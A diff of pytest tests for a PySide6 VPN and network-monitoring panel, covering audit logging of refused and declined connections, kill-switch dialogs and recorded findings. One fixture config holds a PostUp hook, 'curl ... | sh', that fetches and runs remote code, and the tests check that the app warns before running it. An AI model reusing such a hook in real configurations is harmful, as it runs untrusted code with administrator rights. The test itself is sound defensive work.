+    # Interface-only profiles need a wg-quick config on disk to be connectable.
+    confs = tmp_path / "wireguard"
+    confs.mkdir()
+    for name in ("wg0", "wg1", "wg2", "wg3", "wgtest"):
+        (confs / f"{name}.conf").write_text("[Interface]\n")
+    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(confs),))
     from ui.panels.vpn import VpnPanel
     from services.vpn_diagnostics import VpnProfileCatalog
     from PySide6.QtWidgets import QMessageBox
@@ -2833,12 +3395,14 @@ def tunnel(qapp, monkeypatch):
 
 class TestTunnelPanel:
 
-    def test_it_builds_hidden_with_six_result_tabs(self, tunnel):
+    def test_it_builds_hidden_with_eight_tabs(self, tunnel):
         assert tunnel.isHidden() is True
-        assert tunnel.tabs.count() == 6
+        assert tunnel.tabs.count() == 8
         assert tunnel.tabs.tabText(0) == "Diagnostics"
         assert tunnel.tabs.tabText(3) == "Action Preview"
         assert tunnel.tabs.tabText(5) == "Execution"
+        assert tunnel.tabs.tabText(6) == "Privacy"
+        assert tunnel.tabs.tabText(7) == "Servers"
 
     def test_connecting_a_real_profile_starts_the_connection_worker(self, tunnel, monkeypatch):
         from PySide6.QtWidgets import QMessageBox
@@ -2926,6 +3490,120 @@ class TestTunnelPanel:
         tunnel.connect_vpn()
         assert FakeVpnConnectionWorker.instances == []
 
+    # ── Every attempt is audited, refused and declined ones included ──────
+
+    @staticmethod
+    def _audit_to(monkeypatch, tmp_path):
+        import json
+        from services import vpn_execution
+        path = tmp_path / "tunnel_audit.jsonl"
+        monkeypatch.setattr(vpn_execution, "default_audit_path", lambda: path)
+        return lambda: [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []
+
+    def test_a_template_refusal_is_audited(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "information", staticmethod(lambda *a, **k: None))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Example — Japan", {
+            "name": "Example — Japan", "protocol": "WireGuard",
+            "endpoint": "<SERVER_IP>", "interface": "wgjp", "placeholder": True})
+        tunnel.connect_vpn()
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["action"] == "connect" and entry["outcome"] == "refused"
+        assert entry["profile"] == "Example — Japan"
+        assert "emplate" in entry["error"]
+
+    def test_a_blocked_review_is_audited_with_its_blockers(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available",
+                            lambda: False)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        (entry,) = entries()
+        assert entry["outcome"] == "refused"
+        assert entry["blockers"] and any("wg-quick" in b for b in entry["blockers"])
+        assert entry["interface"] == "wg0" and entry["protocol"] == "WireGuard"
+
+    def test_a_declined_confirmation_is_audited_as_declined(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        tunnel.disconnect_vpn()
+        assert FakeVpnConnectionWorker.instances == []
+        assert [(e["action"], e["outcome"]) for e in entries()] == [
+            ("connect", "declined"), ("disconnect", "declined")]
+        assert "declined" in tunnel.connection_status_label.text()
+
+    def test_an_accepted_confirmation_writes_no_refusal_entry(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        assert len(FakeVpnConnectionWorker.instances) == 1
+        assert entries() == []          # execute() audits the real attempt itself
+
+    def test_a_config_with_root_hooks_needs_a_second_confirmation(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        entries = self._audit_to(monkeypatch, tmp_path)
+        conf = tmp_path / "wgh.conf"
+        conf.write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            "PostUp = curl -s http://203.0.113.9/x | sh\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+        prompts = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: prompts.append(("question", a[1], a[-1])) or QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "warning",
+                            staticmethod(lambda *a, **k: prompts.append(("warning", a[1], a[-1])) or QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Hooked", {
+            "name": "Hooked", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+            "interface": "wgh", "config_path": str(conf)})
+        tunnel.connect_vpn()
+        # First prompt accepted, second (the hook warning, default No) declined.
+        assert [kind for kind, _, _ in prompts] == ["question", "warning"]
+        assert prompts[1][1].startswith("This config runs commands as administrator")
+        assert prompts[1][2] == QMessageBox.No
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["outcome"] == "declined"
+        assert any("as administrator" in w for w in entry["warnings"])
+
+    def test_a_config_without_hooks_asks_once(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        prompts = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: prompts.append("q") or QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "warning",
+                            staticmethod(lambda *a, **k: prompts.append("w") or QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        assert prompts == ["q"]
+        assert len(FakeVpnConnectionWorker.instances) == 1
+
     def test_a_successful_connect_updates_status(self, tunnel):
         tunnel._on_connection_finished({"success": True, "protocol": "WireGuard", "output": "up"})
         assert "WireGuard" in tunnel.connection_status_label.text()
@@ -2962,6 +3640,33 @@ class TestTunnelPanel:
             "endpoint": "<SERVER_IP>", "interface": "wgjp", "placeholder": True})
         tunnel.arm_kill_switch()
         assert FakeVpnConnectionWorker.instances == []
+
+    def test_the_arm_dialog_defaults_to_no_and_names_rules_and_recovery(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        entries = self._audit_to(monkeypatch, tmp_path)
+        monkeypatch.setattr(vpn_connection, "killswitch_supported", lambda: True)
+        monkeypatch.setattr(vpn_connection, "killswitch_recovery_command",
+                            lambda: "sudo pfctl -a sentinel -F all")
+        asked = []
+
+        def question(parent, title, text, buttons, default=None):
+            asked.append((text, default))
+            return QMessageBox.No
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(question))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0", "port": 51820})
+        tunnel.arm_kill_switch()
+        (text, default), = asked
+        assert default == QMessageBox.No
+        assert "UDP/51820" in text and "203.0.113.7" in text
+        assert "sudo pfctl -a sentinel -F all" in text
+        assert FakeVpnConnectionWorker.instances == []
+        (entry,) = entries()
+        assert entry["action"] == "killswitch-arm" and entry["outcome"] == "declined"
+        assert "declined" in tunnel.kill_switch_status_label.text()
 
     def test_kill_switch_result_updates_its_own_status(self, tunnel):
         tunnel._on_killswitch_finished({"success": True, "output": "Kill switch ARMED"})
@@ -3382,6 +4087,48 @@ class TestSentryPanel:
     def test_it_builds_hidden_and_read_only_by_default(self, sentry_panel):
         assert sentry_panel.isHidden() is True
         assert sentry_panel.stop_btn.isEnabled() is False
+
+    def test_recorded_findings_are_shown_when_the_panel_opens(self, qapp, monkeypatch, tmp_path):
+        """The background watch writes to the findings log while the app is
+        closed; the panel must show that, not open empty."""
+        import ui.panels.sentry as sentry_module
+        from agents.sentry.sentry import baseline as baseline_module
+        from agents.sentry.sentry.baseline import BaselineStore
+        from agents.sentry.sentry.models import Finding
+        from ui.panels.sentry import SentryPanel
+        monkeypatch.setattr(baseline_module, "default_state_dir", lambda: tmp_path)
+        monkeypatch.setattr(sentry_module, "SentryWatchWorker", FakeSentryWatchWorker)
+        monkeypatch.setattr(sentry_module.watchd, "status",
+                            lambda: {"installed": True, "loaded": True, "interval": 300, "log": ""})
+        BaselineStore().append_findings([Finding(
+            severity="warning", kind="new_listener", title="New listener 0.0.0.0:5900",
+            detail="vnc", evidence={})])
+        panel = SentryPanel(FakeHost())
+        text = panel.findings_box.toPlainText()
+        assert "Recorded by earlier watch passes" in text
+        assert "New listener 0.0.0.0:5900" in text
+
+    def test_a_dry_run_without_a_baseline_says_nothing_was_saved(self, sentry_panel):
+        FakeSentryWatchWorker.next_summary = {
+            "baseline_established": False, "no_baseline": True, "findings": [],
+            "device_count": 2, "listener_count": 1, "connection_count": 0,
+            "dry_run": True, "collector_errors": [],
+        }
+        sentry_panel.run_pass(persist=False)
+        assert "nothing was saved" in sentry_panel.status_label.text()
+        assert "Baseline recorded" not in sentry_panel.findings_box.toPlainText()
+
+    def test_collector_failures_are_shown_and_a_baseline_is_not_adopted(self, sentry_panel):
+        FakeSentryWatchWorker.next_summary = {
+            "baseline_established": False, "baseline_refused": True, "findings": [],
+            "device_count": 0, "listener_count": 0, "connection_count": 0,
+            "collector_errors": ["arp: not found"],
+        }
+        sentry_panel.run_pass(persist=True)
+        assert "COLLECTOR FAILED" in sentry_panel.findings_box.toPlainText()
+        assert "arp: not found" in sentry_panel.findings_box.toPlainText()
+        assert "No baseline saved" in sentry_panel.status_label.text()
+        assert sentry_panel.run_btn.isEnabled() is True
 
     def test_ai_explanation_is_off_by_default(self, sentry_panel):
         # D5: findings carry LAN IPs, MACs and process names; the lesson says
